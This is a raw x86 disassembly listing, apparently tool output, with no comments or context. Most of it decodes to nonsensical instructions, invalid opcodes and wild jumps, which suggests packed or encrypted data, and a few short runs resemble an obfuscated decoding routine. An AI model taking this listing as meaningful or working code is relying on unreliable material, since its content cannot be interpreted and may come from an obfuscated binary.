  408510:	int3   
  408511:	(bad)  
  408512:	fisubr DWORD PTR [edx]
  408514:	popa   
  408515:	xchg   esi,eax
  408516:	retf   
  408517:	push   0x58fdd5f6
  40851c:	pop    ebp
  40851d:	jae    0x4084ea
  40851f:	xchg   esi,eax
  408520:	jecxz  0x408504
  408522:	jns    0x4084f4
  408524:	xor    BYTE PTR [eax+ebp*4+0xe39f25],bh
  40852b:	mov    ebp,0x334f709d
  408530:	pop    ebp
  408531:	clc    
  408532:	fmul   DWORD PTR [ebx-0x5]
  408535:	xchg   esi,eax
  408536:	xchg   DWORD PTR [edx-0x2],ecx
  408539:	es out dx,eax
  40853b:	mov    dh,0xef
  40853d:	dec    ebp
  40853e:	repnz or eax,0x13e18d5
  408544:	loope  0x4084eb
  408546:	mov    cl,0x1e
  408548:	sub    cl,bl
  40854a:	iret   
  40854b:	sahf   
  40854c:	shl    BYTE PTR [ecx],1
  40854e:	sbb    bh,0xa4
  408551:	ret    0xbd0c
  408554:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408555:	in     eax,0xeb
  408557:	and    bl,BYTE PTR [eax-0x37327c6b]
  40855d:	jb     0x408518
  40855f:	lock mov al,0x1
  408562:	in     al,0xaa
  408564:	sbb    dl,ah
  408566:	imul   esi,esi,0x20b7470f
  40856c:	in     eax,dx
  40856d:	mov    ah,0xfe
  40856f:	loop   0x408563
  408571:	pop    edx
  408572:	dec    esp
  408573:	les    ebx,FWORD PTR [esi]
  408575:	lods   eax,DWORD PTR ds:[esi]
  408576:	jno    0x4085ce
  408578:	mov    BYTE PTR [ebp-0x1e2c6d13],dh
  40857e:	sbb    al,0x4
  408580:	sbb    DWORD PTR [edx+0x25],eax
  408583:	mov    dh,0x8b
  408585:	adc    al,0x62
  408587:	or     bh,ch
  408589:	mov    ds:0xd866eccd,al
  40858e:	xchg   dh,ch
  408590:	dec    esi
  408591:	jb     0x4085fa
  408593:	sub    al,0x90
  408595:	stos   BYTE PTR es:[edi],al
  408596:	enter  0xa4ee,0xc1
  40859a:	pop    edi
  40859c:	(bad)  
  40859d:	cmp    DWORD PTR [esi],ebp
  40859f:	push   ebx
  4085a0:	and    DWORD PTR [eax+0x47b1b30f],ebx
  4085a6:	dec    ecx
  4085a7:	xor    ecx,eax
  4085a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085aa:	add    ebp,ecx
  4085ac:	sbb    eax,DWORD PTR ds:0x69306ae1
  4085b2:	adc    esp,DWORD PTR [ebx]
  4085b4:	aam    0xba
  4085b6:	lock jp 0x408559
  4085b9:	sub    edx,DWORD PTR [eax]
  4085bb:	call   0x20cb:0x2b8baddd
  4085c2:	and    eax,0x771ad900
  4085c7:	xchg   ebp,eax
  4085c8:	stos   BYTE PTR es:[edi],al
  4085c9:	push   0x1084b9bd
  4085ce:	inc    edx
  4085cf:	fstp   QWORD PTR [eax+0x23422df6]
  4085d5:	out    0xd3,eax
  4085d7:	and    ch,cl
  4085d9:	mov    esp,0xc54536c4
  4085de:	pop    es
  4085df:	outs   dx,BYTE PTR ds:[esi]
  4085e0:	xlat   BYTE PTR ds:[ebx]
  4085e1:	fstp   DWORD PTR [ecx+eax*1-0x3cc4eb6d]
  4085e8:	fwait
  4085e9:	xchg   edi,eax
  4085ea:	call   0x414119e8
  4085ef:	nop
  4085f0:	xor    bh,BYTE PTR [edi]
  4085f2:	dec    esp
  4085f3:	adc    al,0x32
  4085f5:	push   0xc32adcde
  4085fa:	addr16 jge 0x4085f0
  4085fd:	pop    edx
  4085fe:	inc    esp
  4085ff:	popa   
  408600:	ja     0x40863f
  408602:	or     BYTE PTR [esi],cl
  408604:	inc    edi
  408605:	sub    ah,ch
  408607:	push   eax
  408608:	mov    ds:0xab78df9d,eax
  40860d:	dec    esp
  40860e:	or     edi,DWORD PTR [esi+0x51a9f20]
  408614:	adc    eax,DWORD PTR [eax+0x4]
  408617:	fild   DWORD PTR [ecx-0x42]
  40861a:	dec    edx
  40861b:	loop   0x4085cd
  40861d:	test   BYTE PTR [ecx-0x45ed922c],bh
  408623:	push   ebx
  408624:	stc    
  408625:	add    ebx,esi
  408627:	jg     0x408625
  408629:	(bad)  
  40862a:	(bad)  
  40862b:	in     eax,dx
  40862c:	imul   edx,DWORD PTR [ebx+0x2],0x18e05435
  408633:	add    esp,esi
  408635:	and    eax,0xe4673b76
  40863a:	pop    ecx
  40863b:	jno    0x408656
  40863d:	mov    ecx,0x49d63776
  408642:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408643:	mov    cs,WORD PTR [ebx-0x68]
  408646:	cwde   
  408647:	lods   al,BYTE PTR ds:[esi]
  408648:	leave  
  408649:	hlt    
  40864a:	aad    0xfb
  40864c:	pusha  
  40864d:	ret    
  40864e:	dec    DWORD PTR [ecx+0x1e]
  408651:	mov    esp,0x3ec6303d
  408656:	retf   0x3937
  408659:	cwde   
  40865a:	push   esp
  40865b:	and    esp,DWORD PTR [ebp-0x61]
  40865e:	xchg   eax,edx
  408660:	ss call 0x3221:0x8b088817
  408668:	call   0xf5c:0x4921fad6
  40866f:	xchg   DWORD PTR [ebx+0x432541cf],esp
  408675:	call   0x8255dc9b
  40867a:	repz fist WORD PTR [ebx]
  40867d:	xchg   ecx,eax
  40867e:	mov    dl,0x66
  408680:	in     al,0x4
  408682:	es sti 
  408684:	aad    0x76
  408686:	addr16 loopne 0x408630
  408689:	xchg   ebp,eax
  40868a:	mov    esi,0xc72ba25d
  40868f:	inc    esi
  408690:	outs   dx,DWORD PTR ds:[esi]
  408691:	int    0xe4
  408693:	jmp    0x408650
  408695:	sbb    BYTE PTR [ebx-0x70],dl
  408698:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408699:	inc    ebx
  40869a:	mov    ebx,0x8e12feb8
  40869f:	adc    DWORD PTR ds:0x433663,0x4335fb
  4086a9:	mov    DWORD PTR [ebp-0xc],ebx
  4086ac:	sbb    DWORD PTR ds:0x4336ef,0x433727
  4086b6:	jmp    0x4088fd
  4086bb:	pop    edi
  4086bc:	push   ebp
  4086bd:	jg     0x4086a0
  4086bf:	xor    eax,0xe8516171
  4086c4:	add    DWORD PTR [edx-0x518783b6],ecx
  4086ca:	jmp    0x408656
  4086cc:	(bad)  
  4086cd:	jle    0x40874d
  4086cf:	and    al,0x7c
  4086d1:	jle    0x408751
  4086d3:	cdq    
  4086d4:	cmp    al,0x1d
  4086d6:	sbb    dh,ch
  4086d8:	call   0x7d9e:0xf3044e04
  4086df:	fwait
  4086e0:	xor    al,0x7f
  4086e2:	xchg   edx,eax
  4086e3:	shld   DWORD PTR [esi-0x28eedd29],ebx,cl
  4086ea:	fsub   DWORD PTR [eax+0x64]
  4086ed:	xchg   ecx,eax
  4086ee:	inc    edx
  4086ef:	xchg   ebx,eax
  4086f0:	aam    0xfb
  4086f2:	cmp    DWORD PTR [ecx-0xe],esp
  4086f5:	fxam   
  4086f7:	rcr    eax,cl
  4086f9:	rcr    BYTE PTR [ebx-0x17f3213e],cl
  4086ff:	mov    eax,ds:0x4f735fbd
  408704:	dec    eax
  408705:	fsubr  QWORD PTR [ecx]
  408707:	sbb    ebx,DWORD PTR [si]
  40870a:	pop    ecx
  40870b:	fimul  DWORD PTR [ecx+0x54]
  40870e:	pop    esi
  40870f:	sysexit 
  408711:	aad    0x6e
  408713:	rcr    BYTE PTR [eax],1
  408715:	mov    cl,0x33
  408717:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408718:	xchg   ecx,eax
  408719:	jle    0x408731
  40871b:	clc    
  40871c:	xchg   edx,eax
  40871d:	jp     0x40878e
  40871f:	bound  ecx,QWORD PTR [ecx+ebx*1]
  408722:	ja     0x4086e5
  408724:	enter  0x81e6,0xca
  408728:	jg     0x40875f
  40872a:	xchg   ebp,eax
  40872b:	lock ds xor bh,cl
  40872f:	sub    al,0xa5
  408731:	cli    
  408732:	lods   eax,DWORD PTR fs:[esi]
  408734:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408735:	rcl    DWORD PTR [eax],0xd1
  408738:	call   0x3c7a3c5a
  40873d:	call   0x51c4f158
  408742:	(bad)  
  408743:	push   edx
  408744:	sbb    eax,DWORD PTR [edx+ecx*4]
  408747:	ins    BYTE PTR es:[edi],dx
  408748:	inc    esp
  408749:	sub    al,0x64
  40874b:	aam    0xa
  40874d:	add    al,0xf1
  40874f:	imul   esi,DWORD PTR [edx-0x378ab6a3],0xd4e491c0
  408759:	scas   eax,DWORD PTR es:[edi]
  40875a:	mov    ebp,0x1c9689ec
  40875f:	push   esi
  408760:	int    0x6b
  408762:	mov    WORD PTR [ebx-0x51],ds
  408765:	add    DWORD PTR [ecx],edi
  408767:	cmp    DWORD PTR [ecx+0x364b9a07],ebx
  40876d:	mov    BYTE PTR [esi+0xb9f536c],dl
  408773:	test   al,0xa3
  408775:	inc    ebx
  408776:	or     BYTE PTR [ebp+0x57b7441c],bh
  40877c:	pusha  
  40877d:	mov    ebp,DWORD PTR [esi-0x47c9d18d]
  408783:	add    esp,DWORD PTR [ebp+0x48]
  408786:	mov    eax,0x93636450
  40878b:	add    al,0xb0
  40878d:	sub    al,0xa2
  40878f:	ret    0xacb0
  408792:	add    eax,eax
  408794:	repnz mov edi,0x16ac37db
  40879a:	ins    DWORD PTR es:[edi],dx
  40879b:	push   ds
  40879c:	retf   0xff1d
  40879f:	mov    ds:0x6a5d007,al
  4087a4:	push   edi
  4087a5:	fist   WORD PTR [ebx]
  4087a7:	push   ss
  4087a8:	add    eax,0x2d024c49
  4087ad:	dec    edi
  4087ae:	int    0xb8
  4087b0:	ja     0x408799
  4087b2:	mov    eax,ecx
  4087b4:	cli    
  4087b5:	fcom   DWORD PTR [eax]
  4087b7:	inc    ebp
  4087b8:	inc    ebx
  4087b9:	mov    fs,WORD PTR [esi-0x5c7c1c8f]
  4087bf:	cdq    
  4087c0:	pop    esi
  4087c1:	(bad)  
  4087c2:	js     0x4087c9
  4087c4:	cld    
  4087c5:	addr16 xor al,0x14
  4087c8:	loop   0x408801
  4087ca:	cmp    eax,0xd313fb83
  4087cf:	sbb    BYTE PTR [edi],0x52
  4087d2:	dec    esi
  4087d3:	xchg   ebp,eax
  4087d4:	loope  0x408846
  4087d6:	imul   esp,edx,0x44
  4087d9:	(bad)  
  4087da:	stos   BYTE PTR es:[edi],al
  4087db:	pop    esp
  4087dc:	dec    ecx
  4087dd:	stc    
  4087de:	movq   mm5,mm6
  4087e1:	fldenv [ebx]
  4087e3:	sbb    dl,BYTE PTR [esi]
  4087e5:	pop    edi
  4087e6:	mov    esi,0xcd674aeb
  4087eb:	push   cs
  4087ec:	ins    DWORD PTR es:[edi],dx
  4087ed:	rcl    BYTE PTR [esi+ecx*4+0x27489239],0x59
  4087f5:	test   BYTE PTR [ecx],al
  4087f7:	inc    esp
  4087f8:	inc    edi
  4087f9:	gs add al,0xea
  4087fc:	stos   BYTE PTR es:[edi],al
  4087fd:	test   BYTE PTR [esi+0x4588de7],bl
  408803:	inc    edx
  408804:	fmul   QWORD PTR [eax-0x39]
  408807:	xchg   BYTE PTR [esi-0x56744de6],bh
  40880d:	or     DWORD PTR [esi-0x15],edi
  408810:	ret    
  408811:	adc    ecx,DWORD PTR [edx]
  408813:	jmp    0x6977:0x3253fd23
  40881a:	sub    BYTE PTR [ebx-0x5d],al
  40881d:	loopne 0x40889c
  40881f:	sub    eax,0x7796e618
  408824:	adc    eax,0xdb2509d5
  408829:	pop    es
  40882a:	ss pop ecx
  40882c:	jecxz  0x4087b4
  40882e:	loopne 0x40886d
  408830:	cmp    eax,0xc8e5b758
  408835:	xor    al,0x77
  408837:	mov    BYTE PTR [edx+0x4dd6525b],cl
  40883d:	cs enter 0xdde9,0x15
  408842:	cli    
  408843:	fs inc esp
  408845:	mov    cl,0x2
  408847:	lock cmp eax,0x663ca614
  40884d:	mov    dh,0x8f
  40884f:	(bad)  
  408853:	test   BYTE PTR [eax],dh
  408855:	jl     0x40883f
  408857:	shl    BYTE PTR [esi],0xff
  40885a:	test   eax,0xe01960fe
  40885f:	nop
  408860:	out    dx,eax
  408861:	pop    DWORD PTR [edx+eiz*4]
  408864:	icebp  
  408865:	stos   DWORD PTR es:[edi],eax
  408866:	or     DWORD PTR [edi-0x742f80e8],0x36
  40886d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40886e:	push   edi
  40886f:	add    bh,ah
  408871:	or     cl,dh
  408873:	and    ecx,DWORD PTR [eax]
  408875:	jg     0x4088c4
  408877:	sub    edx,DWORD PTR gs:[edx+edi*1-0x64]
  40887c:	xlat   BYTE PTR ds:[ebx]
  40887d:	mov    al,BYTE PTR [ebp-0x3732e897]
  408883:	jne    0x408901
  408885:	stos   BYTE PTR es:[edi],al
  408886:	in     al,0x1d
  408888:	(bad)  
  408889:	shl    BYTE PTR [edi],0x2d
  40888c:	nop
  40888d:	fild   WORD PTR ds:0xa4339bbf
  408893:	fs cli 
  408895:	mov    DWORD PTR ds:0x460ded66,esp
  40889b:	and    eax,0x712f754b
  4088a0:	ret    0x86f6
  4088a3:	cwde   
  4088a4:	pop    es
  4088a5:	xor    eax,0x7c0e9f8c
  4088aa:	in     eax,0xe3
  4088ac:	and    DWORD PTR [ebx+0x7e],ebx
  4088af:	out    dx,eax
  4088b0:	sub    DWORD PTR [ebx+ebp*1-0x73],ebx
  4088b4:	sar    DWORD PTR [edi],0x83
  4088b7:	sub    BYTE PTR [edi+0x41],bl
  4088ba:	cmp    dl,bh
  4088bc:	(bad)  
  4088be:	mov    cl,0x9d
  4088c0:	call   0xdaae4f05
  4088c5:	sbb    edi,DWORD PTR [ebx-0x34]
  4088c8:	imul   edi,DWORD PTR [edx+0x34],0x332ffa76
  4088cf:	in     eax,dx
  4088d0:	jmp    0xbdd9267c
  4088d5:	push   0xfddcf7d0
  4088da:	jge    0x4088de
  4088dc:	in     al,0x40
  4088de:	ret    0x307a
  4088e1:	cdq    
  4088e2:	mov    esi,0xe8725f1f
  4088e7:	out    0x96,eax
  4088e9:	push   eax
  4088ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088eb:	or     bl,dh
  4088ed:	mov    ch,0xa7
  4088ef:	jg     0x4088cc
  4088f1:	jmp    0x40888d
  4088f3:	sti    
  4088f4:	mov    eax,DWORD PTR [eax+0x4]
  4088f7:	add    eax,DWORD PTR [ebx]
  4088f9:	mul    BYTE PTR [ecx+0x55]
  4088fc:	jmp    0x3663:0x3581008b
  408903:	inc    ebx
  408904:	add    BYTE PTR [edx],ch
  408906:	jl     0x408908
  408908:	add    BYTE PTR [esi-0x75],ah
  40890b:	dec    ebp
  40890c:	cld    
  40890d:	adc    DWORD PTR ds:0x4336db,0x67a8
  408917:	movzx  ecx,cx
  40891a:	xor    DWORD PTR ds:0x433653,0x1847
  408924:	add    ecx,DWORD PTR [eax]
  408926:	not    DWORD PTR ds:0x43361f
  40892c:	mov    DWORD PTR [ebp-0x18],ecx
  40892f:	mov    eax,DWORD PTR [ebp+0x8]
  408932:	or     DWORD PTR ds:0x433727,ebx
  408938:	mov    ecx,DWORD PTR [ebp-0x8]
  40893b:	xor    eax,esi
  40893d:	add    eax,edi
  40893f:	cmp    DWORD PTR [ecx],eax
  408941:	jne    0x408e5a
  408947:	dec    ecx
  408948:	mov    eax,DWORD PTR [ebp+0x8]
  40894b:	mov    ecx,DWORD PTR [ebp-0x18]
  40894e:	xor    eax,esi
  408950:	add    eax,edi
  408952:	cmp    DWORD PTR [ecx],eax
  408954:	jmp    0x408b9b
  408959:	stos   BYTE PTR es:[edi],al
  40895a:	adc    edx,esi
  40895c:	inc    ebx
  40895d:	jno    0x4089c0
  40895f:	stos   DWORD PTR es:[edi],eax
  408960:	icebp  
  408961:	jl     0x4089b5
  408963:	and    eax,0xf8ede22c
  408968:	xor    DWORD PTR [eax+0x247e7ed4],0x7c
  40896f:	jle    0x4089ef
  408971:	das    
  408972:	adc    DWORD PTR [esp+ecx*1-0x3c1e693c],edi
  408979:	dec    eax
  40897a:	xor    al,0xbb
  40897c:	dec    esi
  40897d:	mov    edi,0x11d79f17
  408982:	push   edx
  408983:	and    DWORD PTR [eax+0x44dde08d],0x19
  40898a:	retf   
  40898b:	shr    ebx,0xaf
  40898e:	pcmpgtb mm1,QWORD PTR [edx+0xc76f5eb]
  408995:	ficomp WORD PTR ds:0x215d98e1
  40899b:	dec    edx
  40899c:	mov    ebp,DWORD PTR [edx-0xa]
  40899f:	das    
  4089a0:	xor    eax,DWORD PTR [ebp-0x5cbb3772]
  4089a6:	out    0x3a,eax
  4089a8:	add    edi,eax
  4089aa:	xchg   ebx,eax
  4089ab:	pop    esi
  4089ac:	and    al,dh
  4089ae:	mov    ebp,0xc8280bc6
  4089b3:	push   ss
  4089b4:	pop    esp
  4089b5:	cmp    eax,0x78bcb15e
  4089ba:	adc    eax,0x425c3f67
  4089bf:	xchg   esi,eax
  4089c0:	stos   BYTE PTR es:[edi],al
  4089c1:	adc    esp,ecx
  4089c3:	add    ebp,DWORD PTR [edx-0x43b2fc77]
  4089c9:	fld    QWORD PTR [ecx+ebp*1]
  4089cc:	clc    
  4089cd:	pop    ss
  4089ce:	jne    0x408a0e
  4089d0:	pop    esp
  4089d1:	mov    WORD PTR [si+0x16],ds
  4089d5:	xchg   ebp,eax
  4089d6:	dec    ecx
  4089d7:	cmp    DWORD PTR [eax+0x4d],ecx
  4089da:	sub    esp,ecx
  4089dc:	and    DWORD PTR [ecx-0x61e605b5],ebp
  4089e2:	pop    edx
  4089e3:	adc    eax,0x4d6b832
  4089e8:	fwait
  4089e9:	add    al,0x6c
  4089eb:	inc    esi
  4089ec:	xchg   ebx,eax
  4089ed:	cdq    
  4089ee:	pop    esp
  4089ef:	pop    esi
  4089f0:	clc    
  4089f1:	xor    esp,DWORD PTR [edx+0xa]
  4089f4:	sub    al,BYTE PTR [eax+eax*2+0x60d7cc73]
  4089fb:	out    0x16,eax
  4089fd:	jl     0x408986
  4089ff:	jo     0x4089c1
  408a01:	lods   al,BYTE PTR ds:[esi]
  408a02:	mov    ch,BYTE PTR [edi+0x13]
  408a05:	mov    BYTE PTR [edx+0x6092f1c0],ch
  408a0b:	(bad)  
  408a0c:	sbb    ebx,ecx
  408a0e:	push   ebx
  408a0f:	scas   al,BYTE PTR es:[edi]
  408a10:	aad    0xe8
  408a12:	add    DWORD PTR [ecx],0x47
  408a15:	xor    ebp,esi
  408a17:	sahf   
  408a18:	fcomp  DWORD PTR gs:[ebp+ebp*2-0x1e]
  408a1d:	adc    ah,bl
  408a1f:	pop    ebp
  408a20:	imul   eax,DWORD PTR [edi],0x45
  408a23:	(bad)  
  408a24:	sub    al,0xca
  408a26:	dec    ecx
  408a27:	mov    ds:0xf5dbe8a9,eax
  408a2c:	pop    es
  408a2d:	out    0x83,eax
  408a2f:	fnstcw WORD PTR [ebx+edx*1+0x4e]
  408a33:	out    dx,al
  408a34:	in     eax,0xf7
  408a36:	lea    edi,[ecx+ebx*4+0x2fa5adb0]
  408a3d:	lahf   
  408a3e:	lds    ebp,FWORD PTR [esi+0x55]
  408a41:	dec    eax
  408a42:	outs   dx,BYTE PTR ds:[esi]
  408a43:	push   eax
  408a44:	dec    ebx
  408a45:	xor    BYTE PTR [ebx+eiz*1+0x4b747648],0xc9
  408a4d:	mov    ebx,0x3be84b66
  408a52:	lds    ebp,FWORD PTR [eax-0x65a0379d]
  408a58:	mov    bh,0x2f
  408a5a:	jns    0x408aa8
  408a5c:	pop    esi
  408a5d:	scas   al,BYTE PTR es:[edi]
  408a5e:	not    DWORD PTR [esi]
  408a60:	pusha  
  408a61:	adc    DWORD PTR [ecx],ebp
  408a63:	and    DWORD PTR [esi+0x497d8be8],ebp
  408a69:	mov    esp,0x4144fea9
  408a6e:	adc    DWORD PTR [eax],0xffffffd0
  408a71:	cmc    
  408a72:	inc    edx
  408a73:	mov    WORD PTR [ecx-0xab8ad7],ss
  408a79:	out    dx,eax
  408a7a:	cmp    dh,BYTE PTR [edx]
  408a7c:	sbb    BYTE PTR [edi+0x7b],ch
  408a7f:	add    BYTE PTR [ebx+0x7ca21efb],bh
  408a85:	mov    ecx,0xaa369ac0
  408a8a:	shr    DWORD PTR [edi-0x7ff755a1],0x1
  408a91:	test   eax,0x9174820
  408a96:	mov    fs,WORD PTR [eax-0x15]
  408a99:	sbb    al,0xbc
  408a9c:	int    0x84
  408a9e:	cs dec ebp
  408aa0:	dec    esp
  408aa1:	ins    DWORD PTR es:[edi],dx
  408aa2:	ins    DWORD PTR es:[edi],dx
  408aa3:	jmp    0xc59e3a84
  408aa8:	add    dh,BYTE PTR [ecx]
  408aaa:	(bad)  
  408aab:	or     eax,edx
  408aad:	and    eax,0xe8ff0c16
  408ab2:	loope  0x408acd
  408ab4:	daa    
  408ab5:	xchg   esp,eax
  408ab6:	cmp    eax,0x8bc4f5d1
  408abb:	push   ds
  408abc:	and    BYTE PTR [edi+0x3a],ah
  408abf:	xor    ecx,DWORD PTR [ebx-0x74]
  408ac2:	das    
  408ac3:	pop    edi
  408ac4:	jmp    FWORD PTR [edx+0x31]
  408ac7:	daa    
  408ac8:	mov    al,0x84
  408aca:	scas   eax,DWORD PTR es:[edi]
  408acb:	xchg   edi,eax
  408acc:	test   eax,0xc4662268
  408ad1:	lods   eax,DWORD PTR ds:[esi]
  408ad2:	sub    BYTE PTR [ebx+ecx*8],ah
  408ad5:	gs pop ds
  408ad7:	stos   DWORD PTR es:[edi],eax
  408ad8:	(bad)  
  408ad9:	lea    edi,[edi+0x39a965b6]
  408adf:	rol    ecx,1
  408ae1:	rcr    BYTE PTR [eax],0xc6
  408ae4:	ret    
  408ae5:	or     ch,BYTE PTR [ebx-0x48]
  408ae8:	in     al,dx
  408ae9:	mov    ebx,0x718c48d4
  408aee:	out    0x67,eax
  408af0:	fs out 0xc,eax
  408af3:	mov    WORD PTR [eax-0x6d0f2edf],cs
  408af9:	sbb    bh,BYTE PTR [esi]
  408afb:	inc    ecx
  408afc:	ds xor al,0xbf
  408aff:	cmp    al,0xe6
  408b01:	pop    es
  408b02:	xor    ah,ch
  408b04:	call   0x7d52:0x1b3db774
  408b0b:	inc    esi
  408b0c:	in     eax,dx
  408b0d:	repz popa 
  408b0f:	xor    BYTE PTR [edx-0xa],cl
  408b12:	pop    eax
  408b13:	sbb    eax,0xf452d349
  408b18:	xor    al,0x27
  408b1a:	cld    
  408b1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b1c:	xchg   edx,eax
  408b1d:	or     BYTE PTR [edx],cl
  408b1f:	mov    esp,0x794ac9ce
  408b24:	inc    edi
  408b25:	xor    BYTE PTR [edi-0x6a],0xb1
  408b29:	mov    ds:0xe9c04cf5,eax
  408b2e:	retf   0x36ea
  408b31:	repnz in al,0x74
  408b34:	repnz mov esi,0x3eecee1
  408b3a:	add    al,0xa8
  408b3c:	fs jmp 0x49507da1
  408b42:	sub    eax,0x37c01cb1
  408b47:	(bad)  
  408b48:	xchg   esi,eax
  408b49:	mov    dh,0xc2
  408b4b:	xor    esi,edx
  408b4d:	inc    ebp
  408b4e:	mov    ds:0xaba2f801,al
  408b53:	enter  0x7f48,0xbf
  408b57:	mov    ebx,0xab48c6a0
  408b5c:	idiv   edx
  408b5e:	in     eax,dx
  408b5f:	mov    bh,0x60
  408b61:	in     al,dx
  408b62:	loopne 0x408b00
  408b64:	mov    eax,0xa7a834ce
  408b69:	xchg   ecx,eax
  408b6a:	xchg   ebx,eax
  408b6b:	xorps  xmm5,XMMWORD PTR [edx+0x5c]
  408b6f:	in     eax,dx
  408b70:	add    bl,dl
  408b72:	add    BYTE PTR [esi+edx*8-0x48],0x8b
  408b77:	popf   
  408b78:	stos   DWORD PTR es:[di],eax
  408b7a:	loope  0x408b14
  408b7c:	xchg   ebx,eax
  408b7d:	add    esi,DWORD PTR [edx+eax*8-0x57]
  408b81:	sub    esp,ecx
  408b83:	mov    al,0x7d
  408b85:	pop    ss
  408b86:	ret    0x79cf
  408b89:	mov    ds:0x6c6ee6e,eax
  408b8e:	mov    esp,0xeffa39ba
  408b93:	cmp    esp,DWORD PTR [edx]
  408b95:	mov    ds:0x3a738324,al
  408b9a:	mov    dl,0xf
  408b9c:	test   DWORD PTR ds:0x8b000000,ebx
  408ba2:	inc    ebp
  408ba3:	or     BYTE PTR [ebx-0x39cc0fb3],cl
  408ba9:	add    eax,edi
  408bab:	mov    DWORD PTR [ecx],eax
  408bad:	mov    eax,DWORD PTR [ebp-0x10]
  408bb0:	mov    ecx,DWORD PTR [ebp+0x10]
  408bb3:	xor    ecx,esi
  408bb5:	mov    edx,0xffcd8d65
  408bba:	sub    edx,ecx
  408bbc:	add    DWORD PTR [eax],edx
  408bbe:	mov    eax,ds:0x413c08
  408bc3:	mov    eax,DWORD PTR [eax]
  408bc5:	mov    cx,WORD PTR [ebp-0x4]
  408bc9:	movzx  ecx,cx
  408bcc:	add    ecx,DWORD PTR [eax]
  408bce:	mov    DWORD PTR [ebp-0x18],ecx
  408bd1:	mov    eax,DWORD PTR [ebp+0xc]
  408bd4:	mov    ecx,DWORD PTR [ebp+0xc]
  408bd7:	xor    eax,esi
  408bd9:	add    eax,eax
  408bdb:	xor    ecx,esi
  408bdd:	sub    ecx,eax
  408bdf:	jmp    0x408e26
  408be4:	xchg   ebx,eax
  408be5:	or     BYTE PTR [esi+0x73709572],cl
  408beb:	jmp    0x946e656d
  408bf0:	sub    eax,ecx
  408bf2:	jb     0x408bc0
  408bf4:	data16 sar BYTE PTR [esi+0x7e],cl
  408bf8:	and    al,0x7c
  408bfa:	jle    0x408c7a
  408bfc:	ret    0x22d5
  408bff:	dec    ebp
  408c00:	xor    eax,0x9c23ba69
  408c05:	aad    0x4d
  408c07:	inc    ebx
  408c08:	sbb    eax,DWORD PTR [ebx+0x15]
  408c0b:	xchg   edx,eax
  408c0c:	sbb    BYTE PTR [edx+0xf8e669],bh
  408c12:	cmc    
  408c13:	dec    ebx
  408c14:	push   edx
  408c15:	out    dx,eax
  408c16:	mov    al,ds:0xac30f50a
  408c1b:	pop    eax
  408c1c:	in     eax,dx
  408c1d:	popf   
  408c1e:	jb     0x408c6b
  408c20:	jmp    0xeed0:0x218dc930
  408c27:	dec    ebp
  408c28:	scas   eax,DWORD PTR es:[edi]
  408c29:	push   esp
  408c2a:	in     eax,0x17
  408c2c:	rcr    BYTE PTR [ebx-0x67b2bfab],1
  408c32:	fnstsw WORD PTR [ebx+0x292f548e]
  408c38:	xor    BYTE PTR [ebx],bl
  408c3a:	and    eax,0x626b6520
  408c3f:	popf   
  408c40:	das    
  408c41:	(bad)  
  408c42:	ret    
  408c43:	(bad)  
  408c44:	jge    0x408c60
  408c46:	jecxz  0x408c11
  408c48:	hlt    
  408c49:	or     BYTE PTR [esi],0x7d
  408c4c:	ret    0x78a5
  408c4f:	loope  0x408c7a
  408c51:	sti    
  408c52:	or     al,BYTE PTR [ebx+0x7b85ac74]
  408c58:	fisub  DWORD PTR [ebp+0xb]
  408c5b:	mov    bl,0xe4
  408c5d:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c5f:	(bad)  
  408c61:	rcr    edi,0x3b
  408c64:	cmp    DWORD PTR [edx],eax
  408c66:	in     al,0x94
  408c68:	fwait
  408c69:	mov    al,ds:0x22a3b940
  408c6e:	inc    esi
  408c6f:	imul   ebx,DWORD PTR [edx-0x25],0xffffff8e
  408c73:	adc    al,0xeb
  408c75:	lock imul eax,ecx,0xe84484d9
  408c7c:	mov    eax,ds:0x82503b91
  408c81:	in     al,dx
  408c82:	jb     0x408c70
  408c84:	mov    bh,0x3a
  408c86:	in     eax,dx
  408c87:	push   esp
  408c88:	sbb    bl,bh
  408c8a:	mov    cl,ah
  408c8c:	bound  edx,QWORD PTR [ebp+ebp*2-0x4e4a0872]
  408c93:	and    DWORD PTR [ecx-0x34],edx
  408c96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c97:	cwde   
  408c98:	ins    BYTE PTR es:[edi],dx
  408c99:	jmp    0x408c8e
  408c9b:	inc    ebp
  408c9c:	sar    BYTE PTR [esi+eax*2+0x5a98004d],0x4c
  408ca4:	sub    dl,BYTE PTR [eax]
  408ca6:	cmp    al,0x1f
  408ca8:	dec    ebx
  408ca9:	retf   
  408caa:	mov    bh,0xba
  408cac:	inc    eax
  408cad:	popa   
  408cae:	dec    ebx
  408caf:	shr    DWORD PTR [ecx+0x33],cl
  408cb2:	sub    bh,dh
  408cb4:	mov    DWORD PTR [ebx-0x36],ebp
  408cb7:	imul   esi,DWORD PTR [esi-0x1d],0x3f
  408cbb:	ss jne 0x408d22
  408cbe:	iret   
  408cbf:	fstp   DWORD PTR [esi]
  408cc1:	ins    BYTE PTR es:[edi],dx
  408cc2:	loopne 0x408c76
  408cc4:	cs mov ebx,0xd146d120
  408cca:	imul   esp,esi,0x14fd9dcb
  408cd0:	in     al,dx
  408cd1:	inc    ebp
  408cd2:	and    bh,BYTE PTR [esp+ebx*2]
  408cd5:	out    dx,eax
  408cd6:	fwait
  408cd7:	iret   
  408cd8:	rol    BYTE PTR [edi],1
  408cda:	or     DWORD PTR [esp+edi*1-0x5446ed2d],edi
  408ce1:	fst    DWORD PTR [eax+0x3d]
  408ce4:	pop    esp
  408ce5:	xchg   di,ax
  408ce7:	jne    0x408c8e
  408ce9:	mov    BYTE PTR [edx],ch
  408ceb:	stos   DWORD PTR es:[edi],eax
  408cec:	or     eax,0xb98d10fd
  408cf1:	stos   BYTE PTR es:[edi],al
  408cf2:	mov    ebx,DWORD PTR [esi+0x8]
  408cf5:	cmp    al,0x3c
  408cf7:	mov    edx,0x56e8e022
  408cfc:	out    dx,al
